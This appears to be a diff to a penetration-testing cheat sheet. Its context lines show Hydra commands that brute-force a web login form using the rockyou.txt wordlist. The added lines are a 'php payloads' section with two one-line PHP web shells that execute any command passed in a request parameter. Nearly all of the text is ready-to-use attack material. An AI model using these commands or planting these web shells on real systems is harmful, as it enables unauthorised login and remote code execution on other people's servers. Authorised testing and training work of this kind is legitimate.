@@ -200,3 +200,9 @@ https://github.com/frizb/Hydra-Cheatsheet
 hydra -l admin -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
 hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
 ```
+
+### php payloads
+```
+<?php echo system($_REQUEST ["cmd"]); ?>
+<?php system($_GET['cmd']);?>
+```
